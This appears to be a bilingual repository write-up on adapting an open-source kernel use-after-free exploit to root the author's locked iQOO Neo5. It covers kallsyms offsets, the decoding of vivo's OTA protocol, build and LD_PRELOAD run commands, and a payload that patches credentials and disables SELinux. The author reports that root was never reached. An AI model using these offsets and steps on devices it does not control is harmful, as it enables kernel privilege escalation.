# iQOO Neo5 (PD2055) 临时 Root 研究全记录 — CVE-2026-43499 完整实战
# iQOO Neo5 (PD2055) Temporary Root via CVE-2026-43499 — Full Write-up

> **Author**: Viper-Boss (AI 辅助: DeepSeek Harness)
> **Date**: 2026-11-08 ~ 2026-11-09
> **Device**: iQOO Neo5 (V2055A / PD2055) · 骁龙870 (Snapdragon 870) · Android 14 · OriginOS 4
> **Firmware**: PD2055_A_9.10.3 (kernel 4.19.152-perf+)
> **Status**: 🟡 kallsyms 已逐字节验证(109,687符号) · futex 哈希 bug 已修复并单测通过 ·
> KernelSnitch 的 mm 定位被证明在 4.19 上方法论失效(已加健全性门控) · 提权待走替代路径 ·
> **尚未在真机取得 uid=0**
>
> **本次代码审查修正**：①kallsyms 解析(109,641→109,687, markers 429/429 验证) ②全部 target.h
> 符号偏移(旧值因名字错位而错误) ③futex_hash 起点 bug + 未初始化 padding bug ④MM_STRUCT_SZ
> 0x340→0x3C0 ⑤mm_slab_order 重置 bug ⑥构建系统(默认 PD2055/可复现/无绝对路径)
> ⑦诊断模式隔离破坏性操作 ⑧推翻 §8 旧结论中"2 个 u32"的错误细节

---

## 1. 我为什么要做这件事 / Why I'm doing this

我的 iQOO Neo5 的 Bootloader 锁死，**没有任何解锁路径**：
- `fastboot flashing unlock` → `unknown command`（vivo 从引导加载程序中删除了解锁命令）
- `fastboot oem unlock` → `unknown command`
- vivo 官方 BL 解锁通道多年前就已停止服务
- 该设备没有公开的签名 firehose（EDL/9008 模式无法使用）

我想要不解锁 BL 就获得临时 root，于是找到了 CVE-2026-43499 漏洞（GhostLock exploit）。这篇文章记录了我的完整旅程——包括所有死胡同——希望大家不用再浪费时间重复踩坑。

---

## 2. 总结 — 哪些可行、哪些不可行 / TL;DR

| 步骤 | 状态 | 说明 |
|------|------|------|
| CVE-2026-43499 futex UAF 触发 | ✅ 可用 | 每轮找到 3 个碰撞，设备稳定不崩溃 |
| 固件获取（7GB 全量 OTA 包） | ✅ 可用 | 破解了 vivo 老版 OTA 协议（替换密码+base64） |
| 内核 kallsyms 提取 | ✅ **已验证** | 109,687 符号，markers 429/429 交叉验证通过 |
| target.h 符号偏移 | ✅ **已修正** | 旧值因名字错位而全错，现已逐符号校正 |
| futex 哈希正确性 | ✅ **已修复+单测** | 起点 bug + 未初始化 padding bug，6/6 用例通过 |
| NDK 构建 preload.so / diag | ✅ 可用 | aarch64，SHA256 已记录，可复现 |
| KernelSnitch mm 定位 | ❌ **方法论失效** | 4.19 哈希不含 mm，已加健全性门控拒绝假阳性 |
| 诊断模式隔离 | ✅ 可用 | `GHOSTLOCK_NO_DESTRUCTIVE` 编译排除全部破坏性操作 |
| 最终 uid=0 提权 | ⏳ **未达成** | 需走替代路径（CHEESE_BASE_HUNT / pipe physrw） |

---

## 3. 设备指纹（通过 adb shell 验证）

```
ro.product.model=V2055A
ro.product.device=PD2055
ro.board.platform=kona
ro.soc.model=SM8250 (骁龙870)
ro.build.version.release=14
ro.build.display.id=PD2055_A_9.10.3
ro.build.version.incremental=compiler10161353
ro.build.version.security_patch=2025-09-01
ro.build.type=user / release-keys

# 内核
Linux version 4.19.152-perf+ (compiler@comdg01150025) (clang 10.0.5)
#1 SMP PREEMPT Thu Oct 16 14:02:35 CST 2025

# 启动链
androidboot.verifiedbootstate=green
androidboot.vbmeta.device_state=locked
androidboot.veritymode=enforcing
androidboot.securebootkeyver=4
androidboot.secureboot_enable=1
```

### 内核配置要点（来自 /proc/config.gz — 无需 root 即可读取！）

```
CONFIG_ARM64_VA_BITS=39, PGTABLE_LEVELS=3
CONFIG_PREEMPT=y, CONFIG_FUTEX_PI=y, CONFIG_RT_MUTEXES=y
CONFIG_KALLSYMS=y, CONFIG_KALLSYMS_ALL=y, CONFIG_IKHEADERS=y
CONFIG_SLAB_FREELIST_RANDOM=y, CONFIG_SLAB_FREELIST_HARDENED=y
CONFIG_SLUB_MIRROR=y          # ← vivo 反利用加固
CONFIG_PANIC_ON_REFCOUNT_ERROR=y
CONFIG_PANIC_ON_OOPS 未设置 (PANIC_ON_OOPS_VALUE=0)
CONFIG_MODULE_SIG_FORCE=y (sha512)
CONFIG_STATIC_USERMODEHELPER=y → /system/bin/vivo_coredump
CONFIG_RANDOMIZE_BASE=y (KASLR)
```

---

## 4. 我先踩过的死胡同（免得你也踩）

### 4.1 官方 BL 解锁
- `fastboot flashing get_unlock_ability` 返回 `1`（有解锁能力位）
- 但 `fastboot flashing unlock` → `unknown command`
- vivo 把解锁命令从引导加载程序里完全删除了
- **结论：没有 vivo 内部工具就不可能解锁**

### 4.2 市面上所有"临时 root"工具（月虹/GhostLock/DirtyFrag 等）

我下载并静态分析了约 15 种不同工具。核心发现：

**iQOO 临时 root 生态是一个按机型门控的矩阵：**

| 工具 | 目标机型 | 内核 | 在 Neo5 上可用？ |
|------|---------|------|---------------|
| GhostLock 4.19 (K40 移植版) | 红米 K40 (alioth) | 4.19.157 GKI | ❌ 偏移不同 |
| 月虹提权助手 v1.6.4 | vivo 6.6 GKI 设备 | 6.6.30/57/89 | ❌ 无 vivo 4.19 payload |
| DirtyFrag / DirtyFlag | 5.15-6.12 GKI | 仅 GKI | ❌ 不支持 4.19 |
| KSuRoot | 多种 GKI | 5.10+ | ❌ 需要 init_boot 分区（Neo5 没有） |
| 其他所有工具 | ... | ... | ❌ |

**根本原因**：Neo5（2021年，SM8250）对 GKI 时代的 exploit 生态来说太老了。这些工具都瞄准 2024-2026 年搭载 5.10+ GKI 内核的旗舰设备。Neo5 的 4.19.152 非 GKI 内核从未被适配过。

### 4.3 Recovery 模式 adb
- `adb reboot recovery` 可以进入
- 但 recovery **没有 adbd**（vivo 锁死了）
- 在设备管理器中 USB 设备甚至不枚举
- **结论：无法从 recovery 用 dd 备份分区**

### 4.4 公开固件镜像站
- vivofirmware.com：只有 PD2055_A_1.10.16（2021 年原版）
- onfix.cn、gbfirmware.com、romzj.com.cn：全部止步于 6.x（2023 年）
- **没有任何公开镜像有 9.10.3**（最终 EOL 版本）
- vivo 官方客服确认："官网已取消下载升级包的网页路径"

---

## 5. 固件获取突破（最核心的部分）

这是最难的一步。完整链条如下：

### 5.1 技巧：利用 recovery 自带的联网更新

我重启进 recovery 模式，然后使用 recovery 菜单中的"联网更新"功能。这触发了 recovery：
1. 通过 `wget --post-data param=<混淆串>&jvq=1.0.3 https://sysupgrade.vivo.com.cn/api2` 查询 vivo OTA 服务器
2. 下载一个 7GB 的全量固件包
3. 安装（类型：REPAIR，因为 pre=post=PD2055D_A_9.10.3）

### 5.2 通过 bugreport 获取证据

```bash
adb bugreport
# 提取: FS/cache/recovery/last_log
```

recovery 日志包含：
- 完整的 wget 命令和加密的 `param` 值
- 下载的包路径：`/data/vivo-others/survival/vivo-survival_1.0-UpdateFull_package.zip`
- 安装确认：`INSTALL_SUCCESS`

### 5.3 破解 vivo 老版 OTA 协议（jvq 1.0.3）

这个"加密"实际上是**替换密码 + 标准的 ASCII 明文 base64 编码**——根本不是真正的加密。

**我的破解方法：**

1. **结构分析**：加密数据中所有重复子串的间距都 ≡ 0 (mod 4)，证明是 base64（重复子串只在 mod-4 边界处保持对齐）

2. **已知明文攻击**：请求中包含设备的 IMEI 哈希（`7495e...` — 来自 bugreport 中的 `last_ota_info`）、版本字符串 `PD2055D_A_9.10.3` 和 `PD2055MA`。这些为我提供了推导符号值的锚点。

3. **爬山算法 + oracle 验证**：用推导出的字母表重新编码解码后的明文，必须产生与原始密文完全一致的结果。这验证了答案的正确性。

4. **关键 bug 修复**：标准 base64 的第三个字节公式是 `b2 = ((v2&3)<<6)|v3`，**不是 `<<4`**！这个 bug 我调了几个小时，产生了微妙的错误结果。

**解密后的响应：**

```json
{
  "fileLength": "7039074100",
  "version": "9.10.3",
  "url": "http://sysupgrade.vivo.com.cn/dapi2.do?fileName=%40a160970%3D1Wb74zZnMyZkEQMylyN9YS0gMdN46HMkYHYggQN4FiZ9USMPFQM8DyMwZSN8FSMz1XN90",
  ...
}
```

### 5.4 下载固件

```bash
curl --noproxy '*' -L -C - --retry 30 \
  -o PD2055_A_9.10.3_full.zip \
  "http://sysupgrade.vivo.com.cn/dapi2.do?fileName=%40a160970%3D..."
# 7,039,074,100 字节，~110 MB/s 直连 vivo CDN
```

---

## 6. 内核 kallsyms 提取

固件包中的 boot.img 使用标准 v2 头：
```
kernel_size=50759696, page_size=4096, kernel_addr=0x8000
```

### 6.1 提取内核 Image

内核数据块从偏移 `page_size`（4096）开始，但在真正的 ARM64 Image 前面有一个 52 字节的 vivo 包装头：
```
[52 字节 vivo 头][ARM64 内核 Image (48.4MB)]
```

### 6.2 vivo 的反逆向工程修改

vivo 修改了内核以阻碍 kallsyms 提取：
1. **Image 头字段清零**：`text_offset=0, image_size=0, flags=0`（正常应该是 0x80000 等）
2. **kallsyms_markers 用自定义格式**：u32 值按 8 字节步距存储（标准上游是紧凑 u32 数组）
3. **符号过滤**：从 kallsyms 中**删除了提权敏感符号**（见 6.5）

### 6.3 我自研的 kallsyms 解析器（已逐字节验证）

`vmlinux-to-elf`、`ghostlock-extract` 等工具在 vivo 的修改上都失败，我写了自定义解析器。
**最终结构（全部经 markers 交叉验证）：**

```
Offsets table:  0x1f805cc .. 0x1feb7a8   (109,687 × s32, 首值=0, 尾值=0x3b80708, 0 单调违反)
num_syms:       u32 @ 0x1feb8cc = 0x1AC77 = 109,687
Names:          0x1feb9cc .. 0x215904e   ([u8 len][tokens], 4.19 格式, 无 0x80 扩展)
Markers:        0x21590cc                (429 × u32 @ 8 字节步距)
Token table:    0x2159ecc                (256 个令牌, 909 字节, token[48]='0')
Token index:    0x215a2cc                (256 × u16, 验证 256/256)
```

**关键验证**：全部 **429 个 markers** 满足
`markers[k] == (name[256*k] 的字节偏移) − names_start`，**429/429 精确匹配**。
这从数学上证明了 names_start、num_syms、offsets 表对齐三者都逐字节正确。
`_text` 偏移 == 0，说明 offsets 已经相对 `_text`（CONFIG_KALLSYMS_BASE_RELATIVE，
relative_base 即 `_text` 的 VA）。

> 早期版本报告"109,641 个符号、names@0x1febb9b、offsets@0x1f805bc"是**错误**的：
> names 起点偏晚了 50 条，导致所有名字与偏移错位配对，`init_task`/`commit_creds`
> 等查不到。已用 num_syms(0x1AC77) 与 markers 交叉验证彻底修正为 109,687 条。

### 6.4 target.h 的关键符号（已修正的正确偏移，相对 _text）

```
_text:                    0x00000000   (relative_base)
__start_init_task:        0x02d80000   (init_task 被过滤，用段起始符号代替)
init_uts_ns:              0x02d9ffc8
empty_zero_page:          0x03069000
root_task_group:          0x030701c0
selinux_state:            0x024ce9e0
security_hook_heads:      0x024ce358
kmalloc_caches:           0x024cde48
anon_pipe_buf_ops:        0x01cfa5c0
remove_waiter (漏洞函数): 0x000d8d18
ashmem_fops:              0x01e72080
configfs_read_file:       0x0033cf50
modprobe_path:            0x02db3540
kallsyms_lookup_name:     0x0014c278
panic:                    0x000400a0
printk:                   0x000e0c28
```

### 6.5 重大发现：vivo 过滤了提权敏感符号

下列在通用内核里必然存在的符号，在本 kallsyms 中被**精确移除**：

```
commit_creds          prepare_kernel_cred    init_cred
kernel_init           init_task              _end
__init_begin          __bss_start            _edata        _sdata
```

这正是内核 exploit 工具包最常用的符号集合（经典的 `commit_creds(prepare_kernel_cred(0))`
提权、以及靠 `kallsyms_lookup_name()` 解析这些名字的工具）。**vivo 主动删除了它们。**

对本 exploit 的影响与对策：
- `init_task` → 用 **`__start_init_task`(0x02d80000)** 代替（段起始，地址等价）
- `commit_creds`/`prepare_kernel_cred` → **本 exploit 根本不调用它们**：
  root.c 用 pipe 物理内存写**直接**把 `current->cred` 的 uid/gid/caps 清零/填满
- `init_cred` → 运行时从 `init_task.real_cred` 读出（`pipe_read64`）

所以符号过滤**不致命**，但任何依赖 `kallsyms_lookup_name("commit_creds")` 的工具在此设备上都会失败。

---

## 7. 构建 exploit

我使用开源 [GhostLock CVE-2026-43499 exploit](https://github.com/yijiacloud/ghostlock-cve-2026-43499-4.19-k40)（Apache-2.0，最初为红米 K40/骁龙870级 4.19 内核编写）作为基础。

```bash
# 在 WSL Ubuntu 26.04 中
export NDK_ROOT=~/android-ndk-r27c
CC=$NDK_ROOT/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android35-clang

# 构建 preload.so
$CC -O2 -g0 -Isrc -DTARGET_CONFIG_H="targets/pd2055-4.19.152-perf/target.h" \
    -fPIC -shared -o preload.so -pthread \
    src/main.c src/util.c src/slide.c src/fops.c src/pipe.c src/root.c \
    src/preload.c src/su_blob.S src/wallpaper_blob.S
```

### 在设备上运行

```bash
adb push preload.so /data/local/tmp/
adb shell "LD_PRELOAD=/data/local/tmp/preload.so id"
```

### 运行结果（来自 fsync 日志）：

```
[+] preload starting pid=25073
[+] startup context uid=2000 euid=2000 attr=u:r:shell:s0 enforce=1
[+] build config label=pd2055_4.19.152_perf_a14
[*] memory detected ram=0x300000000 (12 GB)
[*] futex_init hashsize=0x800 (cpus=8)
[*] found 3 collisions
[*] [  0] start finding mm_struct [ffffff8000000000-ffffff8080000000]
...
[-] KernelSnitch mm_struct leak failed
[-] prepare_kernel_page retry 1/12
... (重试 12 次，全部失败)
```

**futex 碰撞检测正常工作**（CVE 触发是功能性的——我们可以通过时序检测哈希碰撞）。设备全程保持稳定（没有内核崩溃，感谢 `PANIC_ON_OOPS=0`）。

---

## 8. 当前阻塞点：KernelSnitch 的 futex 哈希语义（已修正 + 已验证）

> **重要更正**：本节早期版本曾断言"内核只对 2 个 u32 做哈希"。这个细节是**错误**的，
> 已被单元测试证伪。核心判断（mm 不参与哈希 → KernelSnitch 无法定位 mm）依然成立，
> 但理由不是"2 个 u32"。下面是修正后的、有代码和测试证据的版本。

### Linux v4.19 上游 `kernel/futex.c` 的 `hash_futex()`（原文，已核对）

```c
static struct futex_hash_bucket *hash_futex(union futex_key *key)
{
    u32 hash = jhash2((u32*)&key->both.word,                     // 起点 = key+8
                      (sizeof(key->both.word)+sizeof(key->both.ptr))/4,  // (8+8)/4 = 4
                      key->both.offset);                         // initval
    return &futex_queues[hash & (futex_hashsize - 1)];
}
```

ARM64 上 `union futex_key` 布局：

```
key+0  .. key+7   : both.ptr    (u64, mm 指针)     ← 不参与哈希
key+8  .. key+15  : both.word   (u64, 用户地址)    ← 哈希从这里开始
key+16 .. key+19  : both.offset (u32, 页内偏移)    ← 参与哈希 + 作 initval
key+20 .. key+23  : padding                        ← 参与哈希（内核里恒为 0）
```

所以内核**确实哈希 4 个 u32**，但它们是 `[addr_lo, addr_hi, offset, padding]`，
**从 `key+8` 开始，不包含 mm 指针**。（注意：vivo 4.19.152-perf+ 是否改过 `hash_futex()`
尚未通过反汇编其 boot.img 证实——见 §13 待办。上游语义是目前的最佳依据。）

### exploit 原始 `futex_hash_no_trunc()`（bug 版本）

```c
jhash2((uint32_t *)key, OFFSET_OF(typeof(*key), both.offset) / 4,  // 起点 key+0, 16/4=4
       key->both.offset);
// 从 key+0 起哈希 4 个 u32: [mm_lo, mm_hi, addr_lo, addr_hi]
```

exploit 也哈希 4 个 u32，但**起点错了**（key+0 而非 key+8）：把 mm 纳入了哈希，
又把 padding 排除在外，算出的值与内核**完全不同**。

### 我做的修复（`exploit/src/kernelsnitch/futex_hash.h`）

```c
uint32_t futex_hash_no_trunc(futex_key_t *key)
{
    return jhash2((uint32_t *)&key->both.word,
                  (sizeof(key->both.word) + sizeof(key->both.ptr)) / 4,
                  key->both.offset);
}
```

另修复两个隐蔽 bug：
1. `futex_hash()` 里 `futex_key_t key;` **未初始化**，padding 字节（key+20..23）是栈垃圾，
   导致同一输入多次调用哈希不稳定 → 改为 `memset(&key, 0, sizeof(key))`（等价内核 `FUTEX_KEY_INIT`）。
2. `FUTEX_KEY_INIT` 宏引用了**不存在**的 `union futex_key` 类型（原宏从未编译通过）→ 改为 `futex_key_t`。

### 单元测试结果（`make test`，主机 gcc，纯计算，不触发任何漏洞）

```
[PASS] futex_hash_no_trunc() matches kernel hash_futex() exactly   (6/6 用例)
[PASS] futex_hash() bucket matches kernel bucket
[PASS] legacy formula provably disagreed with kernel (bug was real)
[PASS] hash is independent of mm (as in kernel 4.19)
[PASS] probe reports mm-independent hash; KernelSnitch gate will refuse to localize mm
```

### 由此得出的核心结论（这才是真正的阻塞点）

修复后哈希与内核一致，却暴露一个**方法论死结**：

**4.19 的 futex 哈希不含 mm，"用哈希碰撞反推 mm 地址"在数学上不成立。**
不管 mm 候选取什么，`futex_hash(addr, mm)` 都落到同一 bucket，
KernelSnitch 的判据对任意 mm 恒真/恒假——匹配不携带任何 mm 信息，
第一个被扫描的候选就会**假阳性命中**（比失败更危险）。

因此我加了**健全性门控** `futex_hash_mm_dependent()`：`kernelsnitch_bruteforce()`
在 4.19 上直接拒绝报告任何 mm 候选并打印 `UNSOUND`，杜绝 bogus 地址。

### 可行的替代路径（下一轮）

1. **`CHEESE_BASE_HUNT` 模式**：K40 exploit 自带的 configfs fops 劫持，不依赖 mm 定位。
2. **pipe 物理内存原语**：拿到 pipe page 即可 physrw，无需先定位 mm。
3. 坚持 KernelSnitch 则需要一个真正随 mm 变化的侧信道（4.19 上无现成的）。

### slabinfo 补充数据（设备实测，已验证）

```
mm_struct: objsize=960 (0x3C0), 34 objects/slab, 8 pages/slab → order 3
```

`MM_STRUCT_SZ` 已从错误的 0x340 改为 **0x3C0**（32768/960=34，与 slabinfo 吻合；
旧值 0x340 会算出 39，与设备不符）。`util.c` 重试逻辑原本把 `mm_slab_order` 重置为 0，
已修正为保持 `MM_ORDER`(3)。vivo 还引入非标准的 `kmalloc-rcl-*` 回收缓存。

---

## 9. 本仓库的关键文件和工具

| 文件 | 说明 |
|------|------|
| `exploit/src/targets/pd2055-4.19.152-perf/target.h` | PD2055 完整偏移表（已修正，markers 验证） |
| `kallsyms.txt` | 完整内核符号表（**109,687** 条目，已验证） |
| `target_offsets.txt` | target.h 的格式化偏移值 |
| `boot.img` (96MB) | 从固件包提取的内核镜像，供社区分析 |
| `xbl_config.elf` | XBL 配置（物理加载地址推导） |
| `exploit/` | 修改后的 GhostLock exploit 源码（含修正的 futex_hash.h） |
| `exploit/src/diag_params.c` | **只读**参数诊断组件（不触发漏洞） |
| `exploit/tests/test_futex_hash.c` | futex 哈希单元测试（主机可跑，16 项） |
| `exploit/Makefile` | 可复现构建（默认 PD2055，含 `test`/`diag`/`diag-payload`） |
| `scripts/` | 全部分析脚本（kallsyms 解析器、OTA 解密器等） |
| `tools/vivo_ota.py` | 独立的 vivo OTA 协议解密/查询/下载工具 |
| `analysis/` | 解密后的 OTA 响应、字母表、slabinfo |
| `logs/` | 设备上的 exploit 执行日志 |

---

## 10. 复现步骤（可复现构建）

```bash
# 0. 环境：WSL2 Ubuntu + Android NDK r27c
export NDK_ROOT=~/android-ndk-r27c        # 或 ANDROID_NDK_HOME
cd exploit

# 1. 主机单元测试（不需要 NDK，不触发漏洞，纯算法验证）
make test          # 编译并运行 test_futex_hash + diag_params(host)

# 2. 只读参数诊断（设备端，验证 target.h 与真机 slabinfo/CPU 一致）
NDK_ROOT=$NDK_ROOT make diag
adb push build/pd2055-4.19.152-perf/bin/diag_params /data/local/tmp/
adb shell /data/local/tmp/diag_params      # 只读，退出码 0=全部通过

# 3. 构建完整研究 payload（含破坏性提权，仅在你自己设备上用）
NDK_ROOT=$NDK_ROOT make preload            # -> build/.../preload.so

# 4. 构建“诊断版” payload（破坏性操作被编译排除，安全演练漏洞机制）
NDK_ROOT=$NDK_ROOT make diag-payload       # -> build/.../preload_diag.so

# 5. 从固件提取 boot.img 并解析 kallsyms（见 scripts/）
python3 -c "import zipfile; zipfile.ZipFile('PD2055_A_9.10.3_full.zip').extract('boot.img')"
python3 scripts/parse_kallsyms.py
```

构建产物均打印 SHA256；任一步失败返回非零退出码。
`make list-projects` 列出可用 target；`make info` 打印解析到的工具链。

---

## 11. 诊断模式与危险操作隔离（任务边界）

exploit 的破坏性操作全部集中在 **root 阶段**（`root.c: install_android_root`）：
提权（改 cred uid/gid/caps）、关 SELinux（写 enforcing）、装 su、改壁纸、
`kill(system_server)`、tmpfs mount + chcon。

我引入了编译期开关 **`GHOSTLOCK_NO_DESTRUCTIVE`**（`make diag-payload`）：

- `install_android_root()` 在诊断模式下**只读**遍历 current task / cred 并打印，
  然后 `return`，**绝不**调用 `patch_cred_*` / `spawn_root_child` / SELinux 写。
- `spawn_root_child()` 的子进程在诊断模式下**不执行** setuid/setgid/setenforce/su/wallpaper。
- `install_embedded_su()` / `install_embedded_wallpaper()` 在诊断模式下**直接 no-op 返回**。
- 构建时打印 `BUILD MODE: DIAGNOSTIC` 或 `FULL PAYLOAD`，运行时日志再次声明。

验证（对比两个二进制的特征字符串）：

```
DIAG payload 含:  GHOSTLOCK_NO_DESTRUCTIVE / DIAGNOSTIC mode / root(diag)
DIAG payload 不含: "embedded su daemon ready" / "wallpaper install data="   (absent-good)
FULL payload 含:  "embedded su daemon ready" / "wallpaper install data="   (PRESENT-good)
preload.so 137072 B  vs  preload_diag.so 128600 B  (破坏性代码被编译排除)
```

`diag_params`（独立组件）则**根本不运行 exploit**：只做纯哈希计算 + 读 `/proc/slabinfo`、
`/sys/.../cpu/possible`，不触发 CVE、不写任何分区、不改 SELinux。

> 说明：完整 payload 仍**不含**任何 boot/vbmeta/abl/xbl/devinfo 分区写入或擦除/刷机操作——
> 原 exploit 就没有这类逻辑，我也没有添加。持久化只到"装一个 su daemon + 改壁纸"级别，
> 且这些在诊断版里全部禁用。

---

## 12. Bootloader 锁状态（纯静态分析，未尝试解锁）

设备事实（adb 读取）：
```
fastboot flashing get_unlock_ability = 1
fastboot flashing unlock             = unknown command
fastboot oem unlock                  = unknown command
androidboot.verifiedbootstate = green
androidboot.vbmeta.device_state = locked
androidboot.veritymode = enforcing
androidboot.securebootkeyver = 4 ; secureboot_enable = 1
```

静态分析结论（**均为推断，未验证**）：

1. **谁管理锁状态**：vivo 设备的解锁状态通常存于 `devinfo`/`frp` 分区的一个标志位，
   由 ABL（`abl.elf`，Android Bootloader）在 fastboot 阶段读取，并写进
   `androidboot.vbmeta.device_state` 传给 AVB。`get_unlock_ability=1` 只表示
   "策略上允许解锁"这个 bit 被置位，**不代表解锁命令存在**。
2. **`get_unlock_ability=1` 的含义**：这是 `fastboot flashing get_unlock_ability`
   返回的标准能力位。vivo 把 `flashing unlock`/`oem unlock` 的**命令处理**从 ABL 里
   删掉了，所以能力位为 1 但命令 `unknown` —— 二者不矛盾。
3. **AVB / Secure Boot / 锁的关系**：`secureboot_enable=1` + `keyver=4` 说明 PBL→XBL→ABL
   链是签名校验的；`verifiedbootstate=green` 表示 vbmeta 校验通过且设备 locked。
   locked 状态下 AVB 强制校验 boot/vbmeta，改 boot.img 会导致 `red` 且拒绝启动。
4. **`xbl_config.elf` 能提供什么**：内含 FDT（内存映射、外设基址），可用于推导
   内核物理加载地址，**但不含**解锁逻辑或 devinfo 标志（那在 abl.elf / 分区里）。
5. **还缺哪些材料**（若要继续 BL 研究）：`abl.elf`、`devinfo`/`frp` 分区镜像、
   `vbmeta.img`、fastboot 全量 `getvar all` 输出、以及各阶段串口日志。

**明确不做**：不修改锁状态属性、不盲写分区、不伪造解锁。当前路线是**临时 root**
（内存态提权，重启即失效），与 BL 解锁、持久化 root 是三件不同的事——见 §13。

---

## 13. 临时 Root / 持久化 Root / Bootloader 解锁 —— 三者区分

| 维度 | 临时 Root（本项目目标） | 持久化 Root | Bootloader 解锁 |
|------|------------------------|-------------|-----------------|
| 手段 | CVE-2026-43499 内存提权 | 改 boot/装 Magisk | fastboot flashing unlock |
| 存活 | **重启即失效** | 跨重启保留 | 永久改变设备状态 |
| 需要 BL 解锁? | **否** | 通常是 | —— |
| 本设备可行? | 研究中（见 §8 阻塞） | 否（locked+AVB green） | **否**（命令被删） |
| 会触发 AVB red? | 否（不改分区） | 会 | 会（变 orange/unlocked） |

本仓库**只**追求临时 root：全程不写 boot/vbmeta/任何分区，重启后设备恢复原状。

---

## 14. 验证与验收（真实结果，未伪造）

| 测试项 | 命令 | 结果 |
|--------|------|------|
| futex 哈希 vs 内核 v4.19 | `make test` | **PASS 6/6**（含 legacy bug 复现） |
| 哈希 mm 无关性 | `make test` | **PASS**（证明 KernelSnitch 定位失效） |
| 健全性门控探针 | `make test` | **PASS**（4.19 上拒绝定位 mm） |
| mm_struct slab 算术 | `make test` | **PASS**（0x3C0→34 obj/slab 与 slabinfo 吻合） |
| kallsyms markers 交叉验证 | `scripts`/`verify_final.py` | **PASS 429/429** |
| offsets 单调性 | `verify_final.py` | **PASS**（0 违反，首=0 尾=0x3b80708） |
| aarch64 payload 构建 | `make preload` (NDK r27c) | **PASS** sha256 fa014b6e… |
| 诊断 payload 构建 | `make diag-payload` | **PASS** sha256 564d87a0… |
| 诊断版排除破坏性代码 | strings 对比 | **PASS**（su/wallpaper 路径 absent） |
| 设备端 diag_params | 需在真机跑 | **NOT TESTED**（本轮不在真机运行） |
| 完整提权（uid=0） | 需真机 + 替代路径 | **NOT TESTED / 未达成** |

诚实声明：**尚未在任何真机上取得 uid=0**。§8 的 KernelSnitch 路径已被证明在 4.19 上
方法论失效；提权需要走 §8 的替代路径（CHEESE_BASE_HUNT / pipe physrw），留待下一轮。

---

## 15. 已验证结论 vs 仍是假设

**已通过代码/固件验证：**
- kallsyms 结构与全部符号偏移（markers 429/429、offsets 单调、_text=0）
- vivo 过滤了 commit_creds/prepare_kernel_cred/init_cred/kernel_init/init_task 等
- futex 哈希修复后与上游 v4.19 `hash_futex()` 逐位一致（单元测试）
- 4.19 futex 哈希不含 mm → KernelSnitch 定位方法论失效
- mm_struct=960B/order3、构建产物 SHA256、诊断版排除破坏性代码

**仍是假设（需真机或反汇编确认）：**
- `KIMAGE_TEXT_BASE=0xffffff8008080000`（KASLR 运行时才定；沿用 K40 同族假设）
- vivo 4.19.152-perf+ **未改** `hash_futex()`（仅对照上游，未反汇编其 boot.img 证实）
- task_struct/cred/pipe 等**结构体字段偏移**（与 K40 4.19 参考逐项一致，但未从本机 DWARF 证实；
  设备 `CONFIG_IKHEADERS=y`，下一轮可从 Image 提取头文件精确验证）
- `SLIDE_RANDOM_BOOT_ID_DATA`（被过滤的静态符号，暂等于 sysctl_bootid，需运行时确认）
- 结构体偏移的运行时正确性（exploit 成功时会打印，用于回校）

---

## 16. 下一轮可在真机执行的“只读”诊断命令

以下命令**只读**，不提权、不写分区、不改 SELinux，可安全在真机跑：

```bash
# 1. 只读参数诊断（验证 target.h 与真机一致）
adb push exploit/build/pd2055-4.19.152-perf/bin/diag_params /data/local/tmp/
adb shell /data/local/tmp/diag_params

# 2. 确认 mm_struct / kmalloc slab 几何
adb shell "cat /proc/slabinfo | grep -E 'mm_struct|kmalloc-1k|kmalloc-rcl'"

# 3. 确认 CPU 数（futex_hashsize = roundup_pow2(256*cpus)）
adb shell "cat /sys/devices/system/cpu/possible"

# 4. 确认内核版本 / KASLR / 关键 config
adb shell "uname -a; zcat /proc/config.gz | grep -E 'IKHEADERS|KALLSYMS|SLUB_MIRROR|FUTEX'"

# 5. 提取 kheaders（CONFIG_IKHEADERS=y）以精确验证结构体偏移
adb shell "cat /sys/kernel/kheaders.tar.xz" > kheaders.tar.xz   # 若存在

# 6. 诊断版 payload 演练（触发 CVE 机制但绝不通提权/改系统）
adb push exploit/build/pd2055-4.19.152-perf/bin/preload_diag.so /data/local/tmp/
adb shell "LD_PRELOAD=/data/local/tmp/preload_diag.so id"   # 看 fsync 日志到 /sdcard/Download
```

---

## 17. 致谢和参考

- [GhostLock CVE-2026-43499 exploit](https://github.com/yijiacloud/ghostlock-cve-2026-43499-4.19-k40) by yijiacloud (Apache-2.0)
- [CVE-2026-43499](https://nvd.nist.gov/vuln/detail/CVE-2026-43499) — rtmutex remove_waiter() UAF
- [Linux v4.19 kernel/futex.c](https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/kernel/futex.c?h=v4.19) — `hash_futex()` 原文
- 上游: [NebuSec/CyberMeowfia](https://github.com/NebuSec/CyberMeowfia) (IonStack)
- [VIVO-OTA-Tracker](https://github.com/mytiantian001/VIVO-OTA-Tracker) — vivo OTA 查询工具
- [vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf) — 内核符号提取（在 vivo 修改上失败）

## 18. 许可证 / License

本仓库使用 **GPLv3** 许可证。exploit 源码继承上游 Apache-2.0 许可证。

---

*本研究仅供教育目的。请仅在你自己拥有的硬件上使用。*
*This research is for educational purposes. Use only on hardware you own.*
